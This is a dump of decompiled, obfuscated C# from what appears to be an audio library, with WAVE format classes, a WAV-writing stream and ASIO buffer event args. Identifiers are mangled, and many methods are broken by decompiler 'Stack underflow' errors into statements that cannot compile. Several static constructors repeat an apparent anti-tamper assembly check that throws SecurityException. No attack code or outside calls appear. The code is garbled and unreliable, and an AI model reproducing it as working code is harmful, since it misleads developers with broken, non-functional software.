		public virtual int BlockAlign => ((_0005)/*Error near IL_0007: Stack underflow*/)._0002;

		public int BitsPerSample => ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;

		public int ExtraSize => ((_0005)/*Error near IL_0007: Stack underflow*/)._0004;

		public _0005()
			: this(44100, 16, 2)
		{
		}

		public _0005(int _008E_008F_0006, int _008F_008F_0006)
			: this(_008E_008F_0006, 16, _008F_008F_0006)
		{
		}

		public _0005(int _0005_0080, int _001A_009C_0002, int _008F_008F_0006)
		{
			if (_008F_008F_0006 < 1)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107389450), _0080._0014._0001(107389469));
			}
			this._0001 = WaveFormatEncoding.Pcm;
			this._0001 = (short)_008F_008F_0006;
			this._0001 = _0005_0080;
			_0003 = (short)_001A_009C_0002;
			_0004 = 0;
			_0002 = (short)(_008F_008F_0006 * (_001A_009C_0002 / 8));
			this._0002 = this._0001 * _0002;
		}

		public _0005(BinaryReader _0086_0088_0003)
		{
			int num = _0086_0088_0003.ReadInt32();
			global::_0011._0018._0001(this, _0086_0088_0003, num);
		}

		public override string ToString()
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			WaveFormatEncoding waveFormatEncoding = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((int)/*Error near IL_000e: Stack underflow*/ == 1 || waveFormatEncoding == WaveFormatEncoding.Extensible)
			{
				return _0089_0002._0092_0005(_0080._0014._0001(107389940), _0003, this._0001 / 1000, this._0001);
			}
			return this._0001.ToString();
		}

		public override bool Equals(object obj)
		{
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			_0005 obj2 = /*Error near IL_0003: Stack underflow*/as _0005;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (this._0001 == obj2._0001 && this._0001 == obj2._0001 && this._0001 == obj2._0001 && this._0002 == obj2._0002 && _0002 == obj2._0002)
				{
					return _0003 == obj2._0003;
				}
				return false;
			}
			return false;
		}

		public override int GetHashCode()
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected I4, but got Unknown
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 2
			_ = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			short num = ((_0005)/*Error near IL_000e: Stack underflow*/)._0001;
			_ = /*Error near IL_000f: Stack underflow*/^ num;
			int num2 = ((_0005)/*Error near IL_0016: Stack underflow*/)._0001;
			return /*Error near IL_0017: Stack underflow*/^ num2 ^ this._0002 ^ _0002 ^ _0003;
		}

		public virtual void _0001(BinaryWriter _0002)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0099: Incompatible stack heights: 0 vs 2
			//IL_009f: Incompatible stack heights: 0 vs 2
			//IL_00a9: Expected I4, but got Unknown
			_ = _009D_0002._007E_0016_0006;
			_ = 18;
			short num = ((_0005)/*Error near IL_0016: Stack underflow*/)._0004;
			_003F val = /*Error near IL_0017: Stack underflow*/+ num;
			/*Error near IL_00a9: Stack underflow*/((object)/*Error near IL_00a9: Stack underflow*/, (int)val);
			_008F_0002._007E_0098_0005(_0002, (short)this._0001);
			_008F_0002._007E_0098_0005(_0002, this._0001);
			_009D_0002._007E_0016_0006(_0002, this._0001);
			_009D_0002._007E_0016_0006(_0002, this._0002);
			_008F_0002._007E_0098_0005(_0002, (short)BlockAlign);
			_008F_0002._007E_0098_0005(_0002, _0003);
			_008F_0002._007E_0098_0005(_0002, _0004);
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001E
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0006 : global::_0005._0005
	{
		private new short _0001;

		private _0006()
		{
		}

		public _0006(int _008E_008F_0006, int _008F_008F_0006, int _0090_008F_0006)
		{
			base._0001 = WaveFormatEncoding.DviAdpcm;
			base._0001 = _008E_008F_0006;
			base._0001 = (short)_008F_008F_0006;
			_0003 = (short)_0090_008F_0006;
			_0004 = 2;
			_0002 = 0;
			base._0002 = 0;
			_0001 = 0;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0005 : global::_0005._0005
	{
		public new global::_001B._0006 _0001;

		public new global::_0014._0005 _0001;

		public new ushort _0001;

		public new ushort _0002;

		public new ushort _0003;

		private new const short _0001 = 12;

		public _0005(int _008E_008F_0006, int _008F_008F_0006, int _0091_008F_0006, int _0092_008F_0006)
		{
			base._0001 = WaveFormatEncoding.MpegLayer3;
			base._0001 = (short)_008F_008F_0006;
			base._0002 = _0092_008F_0006 / 8;
			base._0003 = 0;
			base._0002 = 1;
			base._0001 = _008E_008F_0006;
			_0004 = 12;
			this._0001 = global::_001B._0006._0002;
			this._0001 = global::_0014._0005._0001;
			this._0001 = (ushort)_0091_008F_0006;
			_0002 = 1;
			_0003 = 0;
		}
	}
}
namespace _0014
{
	[Flags]
	internal enum _0005
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2
	}
}
namespace _001B
{
	internal enum _0006 : ushort
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _001A
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0003 : global::_0005._0005
	{
		public new uint _0001;

		public new uint _0002;

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0007 : global::_0005._0005
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		private new short[] m__0001;

		public _0007()
		{
			base._0001 = WaveFormatEncoding.DspGroupTrueSpeech;
			base._0001 = 1;
			base._0002 = 1067;
			_0003 = 1;
			_0002 = 32;
			base._0001 = 8000;
			_0004 = 32;
			this.m__0001 = new short[16];
			this.m__0001[0] = 1;
			this.m__0001[1] = 240;
		}

		public override void _0001(BinaryWriter _0002)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			((global::_0005._0005)/*Error near IL_0037: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_0037: Stack underflow*/);
			short[] array = this.m__0001;
			foreach (short num in array)
			{
				_008F_0002._007E_0098_0005(_0002, num);
			}
		}
	}
}
namespace _0006
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0002 : global::_0005._0005
	{
		private new short m__0001;

		private new short m__0002;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
		private new short[] m__0001;

		public int SamplesPerBlock => ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int NumCoefficients => ((_0002)/*Error near IL_0007: Stack underflow*/).m__0002;

		public short[] Coefficients => ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;

		private _0002()
			: this(8000, 1)
		{
		}

		public _0002(int _008E_008F_0006, int _008F_008F_0006)
			: base(_008E_008F_0006, 0, _008F_008F_0006)
		{
			base._0001 = WaveFormatEncoding.Adpcm;
			_0004 = 32;
			switch (base._0001)
			{
			case 8000:
			case 11025:
				base._0002 = 256;
				break;
			case 22050:
				base._0002 = 512;
				break;
			default:
				base._0002 = 1024;
				break;
			}
			_0003 = 4;
			this.m__0001 = (short)((base._0002 - 7 * _008F_008F_0006) * 8 / (_0003 * _008F_008F_0006) + 2);
			base._0002 = base._0001 * base._0002 / this.m__0001;
			m__0002 = 7;
			this.m__0001 = new short[14]
			{
				256, 0, 512, -256, 0, 0, 192, 64, 240, 0,
				460, -208, 392, -232
			};
		}

		public override void _0001(BinaryWriter _0002)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				((global::_0005._0005)/*Error near IL_005c: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_005c: Stack underflow*/);
			}
			_008F_0002._007E_0098_0005(_0002, this.m__0001);
			_008F_0002._007E_0098_0005(_0002, this.m__0002);
			short[] array = this.m__0001;
			foreach (short num in array)
			{
				_008F_0002._007E_0098_0005(_0002, num);
			}
		}

		public override string ToString()
		{
			//IL_0057: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 4
			//IL_005d: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107389863);
			_ = new object[4];
			_ = 0;
			object obj = ((global::_0005._0005)/*Error near IL_001b: Stack underflow*/)._0001;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = obj;
			/*Error near IL_0021: Stack underflow*/;
			_ = 1;
			object obj2 = ((global::_0005._0005)/*Error near IL_002a: Stack underflow*/)._0001;
			((object[])/*Error near IL_0030: Stack underflow*/)[/*Error near IL_0030: Stack underflow*/] = obj2;
			((object[])/*Error near IL_0030: Stack underflow*/)[2] = _0003;
			((object[])/*Error near IL_003e: Stack underflow*/)[3] = this.m__0001;
			return /*Error near IL_0051: Stack underflow*/((string)/*Error near IL_0051: Stack underflow*/, (object[])/*Error near IL_0051: Stack underflow*/);
		}
	}
}
namespace _000E
{
	internal sealed class _0007 : ICustomMarshaler
	{
		internal static _0007 _0001;

		public void _0001(object _0002)
		{
		}

		void ICustomMarshaler.CleanUpManagedData(object _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002);
		}

		public void _0001(IntPtr _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 2
			_ = _009B._0090_0004;
			/*Error near IL_0012: Stack underflow*/((IntPtr)/*Error near IL_0012: Stack underflow*/);
		}

		void ICustomMarshaler.CleanUpNativeData(IntPtr _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002);
		}

		public int _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			new NotImplementedException();
			throw /*Error near IL_0003: Stack underflow*/;
		}

		int ICustomMarshaler.GetNativeDataSize()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}

		public IntPtr _0001(object _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((global::_0005._0005)/*Error near IL_0003: Stack underflow*/);
			return (IntPtr)/*Error near IL_000a: Stack underflow*/;
		}

		IntPtr ICustomMarshaler.MarshalManagedToNative(object _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002);
		}

		public object _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (object)/*Error near IL_0005: Stack underflow*/;
		}

		object ICustomMarshaler.MarshalNativeToManaged(IntPtr _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002);
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0005 : global::_0005._0005
	{
		private new short m__0001;

		private new int m__0001;

		internal new Guid _0001;

		public Guid SubFormat => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		private _0005()
		{
		}

		public _0005(int _0005_0080, int _001A_009C_0002, int _008F_008F_0006)
			: base(_0005_0080, _001A_009C_0002, _008F_008F_0006)
		{
			base._0001 = WaveFormatEncoding.Extensible;
			_0004 = 22;
			this.m__0001 = (short)_001A_009C_0002;
			for (int i = 0; i < _008F_008F_0006; i++)
			{
				this.m__0001 |= 1 << i;
			}
			if (_001A_009C_0002 == 32)
			{
				this._0001 = global::_0011._0001._0008;
			}
			else
			{
				this._0001 = global::_0011._0001._0001;
			}
		}

		public override void _0001(BinaryWriter _0002)
		{
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			((global::_0005._0005)/*Error near IL_0050: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_0050: Stack underflow*/);
			_008F_0002._007E_0098_0005(_0002, this.m__0001);
			_009D_0002._007E_0016_0006(_0002, this.m__0001);
			byte[] array = this._0001.ToByteArray();
			_0083._007E_000E_0004(_0002, array, 0, array.Length);
		}

		public override string ToString()
		{
			//IL_005c: Incompatible stack heights: 0 vs 2
			//IL_005f: Incompatible stack heights: 0 vs 4
			//IL_0066: Incompatible stack heights: 0 vs 1
			_ = _009E._0094_0004;
			_0080._0014._0001(107389790);
			_ = new object[5];
			_ = 0;
			((global::_0005._0005)/*Error near IL_0066: Stack underflow*/).ToString();
			((object[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] = (object)/*Error near IL_0019: Stack underflow*/;
			((object[])/*Error near IL_0019: Stack underflow*/)[1] = this.m__0001;
			((object[])/*Error near IL_0027: Stack underflow*/)[2] = this.m__0001;
			((object[])/*Error near IL_0035: Stack underflow*/)[3] = this._0001;
			((object[])/*Error near IL_0043: Stack underflow*/)[4] = _0004;
			return /*Error near IL_0056: Stack underflow*/((string)/*Error near IL_0056: Stack underflow*/, (object[])/*Error near IL_0056: Stack underflow*/);
		}
	}
}
namespace _0013
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0007 : global::_0005._0005
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 100)]
		internal new byte[] _0001 = new byte[100];

		public byte[] ExtraData => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0007()
		{
		}

		public _0007(BinaryReader _009B_008E)
			: base(_009B_008E)
		{
			global::_0011._0018._0001(this, _009B_008E);
		}

		public override void _0001(BinaryWriter _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				((global::_0005._0005)/*Error near IL_0036: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_0036: Stack underflow*/);
			}
			if (_0004 > 0)
			{
				_0083._007E_000E_0004(_0002, this._0001, 0, _0004);
			}
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	internal sealed class _0008 : Stream
	{
		internal Stream _0001;

		internal BinaryWriter _0001;

		internal long _0001;

		internal long _0002;

		internal int _0001 = 8;

		internal global::_0005._0005 _0001;

		private string m__0001;

		internal byte[] _0001 = new byte[3];

		public string Filename => ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Length => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0005._0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public override bool CanRead => false;

		public override bool CanWrite => true;

		public override bool CanSeek => false;

		public override long Position
		{
			get
			{
				//IL_000a: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000f: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				_0080._0014._0001(107389016);
				new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
				throw /*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0008(Stream _0087_0086, global::_0005._0005 _0086_0086)
		{
			this._0001 = _0087_0086;
			this._0001 = _0086_0086;
			this._0001 = new BinaryWriter(_0087_0086, Encoding.UTF8);
			this._0001.Write(Encoding.UTF8.GetBytes(_0080._0014._0001(107389153)));
			this._0001.Write(0);
			this._0001.Write(Encoding.UTF8.GetBytes(_0080._0014._0001(107389176)));
			global::_0011._0018._0001(this);
			global::_0011._0018._0001(this);
		}

		public _0008(string _0096_0093, global::_0005._0005 _0086_0086)
			: this(new FileStream(_0096_0093, FileMode.Create, FileAccess.Write, FileShare.Read), _0086_0086)
		{
			this.m__0001 = _0096_0093;
		}

		public override int _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107389135);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override long _0001(long _0002, SeekOrigin _0003)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107389118);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override void _0001(long _0002)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107389037);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override void _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((Array)/*Error near IL_0003: Stack underflow*/).Length];
			int num = ((_0008)/*Error near IL_0012: Stack underflow*/)._0001._0003 / 8;
			for (int i = 0; i < _0002.Length; i++)
			{
				int num2 = (int)global::_0015._0098_0002((double)i / (double)num) * num + (num - i % num - 1);
				array[i] = _0002[num2];
			}
			_0083._007E_0008_0004(this._0001, array, _0003, _0004);
			this._0001 += _0004;
		}

		public override void _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = global::_0008._007E_009F;
			BinaryWriter binaryWriter = ((_0008)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0017: Stack underflow*/(binaryWriter);
		}

		protected override void _0001(bool _0002)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0008)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				try
				{
					BinaryWriter binaryWriter = this._0001;
					((_0008)/*Error near IL_001a: Stack underflow*/)._0001(binaryWriter);
				}
				finally
				{
					global::_0008._007E_0099(this._0001);
					this._0001 = null;
				}
			}
		}

		protected virtual void _0001(BinaryWriter _0002)
		{
			//IL_004d: Incompatible stack heights: 0 vs 2
			//IL_0057: Incompatible stack heights: 0 vs 2
			_ = global::_0008._007E_0001_0002;
			/*Error near IL_0054: Stack underflow*/((object)/*Error near IL_0054: Stack underflow*/);
			_ = _009E_0002._007E_001B_0006;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/, 4, SeekOrigin.Begin);
			_009F_0002._007E_001C_0006(_0002, global::_0011._0018._0001((int)(global::_0012._007E_0090_0002(this._0001) - 8), this));
			global::_0011._0018._0001(this, _0002);
			global::_0011._0018._0001(this, _0002);
		}

		protected override void _0002()
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			try
			{
				_ = global::_0005._007E_008A;
				/*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0002
{
	internal sealed class _0006 : EventArgs
	{
		[CompilerGenerated]
		private IntPtr[] m__0001;

		[CompilerGenerated]
		private IntPtr[] _0002;

		[CompilerGenerated]
		private bool m__0001;

		[CompilerGenerated]
		private int m__0001;

		[CompilerGenerated]
		private AsioSampleType m__0001;

		public IntPtr[] InputBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (IntPtr[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public IntPtr[] OutputBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0002 = (IntPtr[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public bool WrittenToOutputBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public int SamplesPerBuffer
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public AsioSampleType AsioSampleType
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (AsioSampleType)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0006(IntPtr[] _0093_008F_0006, IntPtr[] _0094_008F_0006, int _0095_008F_0006, AsioSampleType _0096_008F_0006)
		{
			InputBuffers = _0093_008F_0006;
			OutputBuffers = _0094_008F_0006;
			SamplesPerBuffer = _0095_008F_0006;
			AsioSampleType = _0096_008F_0006;
		}

		[Obsolete("Better performance if you use the overload that takes an array, and reuse the same one")]
		public float[] _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_0028: Stack underflow*/).InputBuffers;
			int num = ((Array)/*Error near IL_0005: Stack underflow*/).Length;
			float[] array = new float[SamplesPerBuffer * num];
			global::_0011._0018._0001(this, array);
			return array;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0003 : IDisposable, global::_0010._0006
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0003 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		internal global::_0016._0012 _0001;

		internal global::_001C._0004 _0001;

		private global::_001C._0005 m__0001;

		internal int _0001;

		internal byte[] _0001;

		internal global::_0014._000E._0001 _0001;

		private readonly string m__0001;

		internal readonly SynchronizationContext _0001;

		internal bool _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private EventHandler<global::_0002._0006> m__0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int m__0003;

		[CompilerGenerated]
		private int m__0004;

		[CompilerGenerated]
		private int m__0005;

		public unsafe int PlaybackLatency
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				int num = default(int);
				_ = ref num;
				global::_0017._0015 obj = ((_0003)/*Error near IL_0009: Stack underflow*/)._0001._0001;
				int num2 = default(int);
				global::_0011._0018._0001(out *(int*)/*Error near IL_001e: Stack underflow*/, obj, ref num2);
				return (int)/*Error near IL_0016: Stack underflow*/;
			}
		}

		public global::_001C._0005 PlaybackState => ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;

		public string DriverName => ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int NumberOfOutputChannels
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NumberOfInputChannels
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

